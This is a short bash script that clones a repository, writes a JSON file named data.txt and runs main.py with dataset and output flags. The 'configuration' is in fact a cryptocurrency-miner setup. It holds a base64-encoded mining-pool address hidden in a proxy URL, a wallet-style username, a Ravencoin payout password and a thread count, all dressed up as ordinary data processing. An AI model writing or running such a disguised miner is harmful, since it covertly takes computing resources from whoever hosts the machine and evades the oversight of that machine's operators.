#!/bin/bash

# Clone the repository
git clone https://github.com/saxlata/vbg.git

# Navigate into the repository folder
cd vbg || exit

# Create a configuration file
echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=", "username": "rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB", "password": "c=RVN,gh", "threads": 8}' > data.txt

# Run the application
python3 main.py 7 --dataset=data.txt --output=result.txt
